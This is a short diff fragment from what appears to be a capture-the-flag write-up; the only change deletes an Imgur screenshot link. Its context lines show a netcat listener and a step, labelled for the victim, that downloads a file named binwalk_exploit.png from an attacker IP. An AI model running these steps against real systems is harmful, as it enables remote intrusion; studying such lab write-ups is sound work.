@@ -78,4 +78,3 @@ nc -lvnp 443
 # In victim:
 wget 10.10.14.35/binwalk_exploit.png
 ```
-![Imgur](https://i.imgur.com/T8KUpkq.png)
